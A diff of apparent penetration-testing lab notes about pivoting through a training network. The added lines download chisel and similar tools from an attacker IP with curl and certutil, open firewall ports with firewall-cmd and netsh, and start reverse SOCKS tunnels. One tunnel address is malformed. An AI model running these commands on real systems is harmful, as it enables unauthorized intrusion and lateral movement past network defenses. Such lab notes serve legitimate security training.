@@ -26,7 +26,7 @@ GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"
 
 http -L 10.50.76.121 -l 10005
 
-
+curl http://10.50.76.121/chisel.exe -o chisel.exe
 curl http://10.50.76.121/chisel -o chisel
 curl http://10.50.76.121/systemCtl -o systemCtl
 curl http://10.50.76.121/socatx64.bin -o socat
@@ -68,7 +68,15 @@ nohup python3 -m http.server 8443 &
 
 certutil.exe -urlcache -f -split http://10.200.96.200:8443/Excel.exe -o Excel.exe
 
-netsh advfirewall firewall add rule name="NAME" dir=in action=allow protocol=tcp localport=PORT
+
+# ProdServ
+nohup ./chisel client 10.50.76.121:10000 R:10007:10.200.96.150:10007:socks &
+firewall-cmd --zone=public --add-port 10007/tcp
+# gitstack, add a rule and a reverse socks proxy 
+netsh advfirewall firewall add rule name="nvmChisel" dir=in action=allow protocol=tcp localport=10007
+
+start-job { .\chisel.exe client 10.200.96.150:10007 R:10007:127.0.0.10008:socks }
+
 
 
 
